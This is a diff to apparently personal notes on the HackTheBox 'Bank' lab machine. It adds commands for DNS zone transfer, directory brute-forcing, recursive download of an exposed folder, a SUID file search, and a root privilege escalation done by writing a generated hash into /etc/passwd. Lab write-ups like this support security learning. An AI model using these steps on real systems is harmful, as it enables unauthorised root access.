@@ -1,6 +1,5 @@
 #### Enumeration
 - Open Ports port `port 22, 53,80`
-- When DNS port is open on TCP, high chances of `zone transfer`
 - No information gathered from the DNS Server
 - Virtual host is guessed `bank.htb` and added to the `/etc/hosts`
 - `balance-transfer` directory enumerated
@@ -60,4 +59,35 @@ dnsrecon -r 10.10.10.0/24 -n 10.10.10.29
 dig axfr @10.10.10.29
 # zone transfer on specifying the domain
 dig axfr bank.htb @10.10.10.29
+```
+
+**Directory Enumeration**
+```bash
+python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -t 20 -u http://bank.htb
+```
+
+**Multiple files download and sorting**
+```bash
+# wget
+# wgets all the files recursively
+wget -r http://bank.htb/balance-transfer/
+# sort
+# obtains the no. of characters in each file and arranges in a decending order
+wc -c *.acc | sort -nr 
+```
+
+**Find files with specific permission**
+```bash
+find / -perm -4000 -exec ls -la 2>/dev/null
+```
+
+**Editing passwd file**
+```bash
+- openssl passwd ippsec
+<generated hash>
+- vi /etc/passwd
+# change the x field with the generated hash
+root:asdasds:.......
+- su  root
+ippsec
 ```
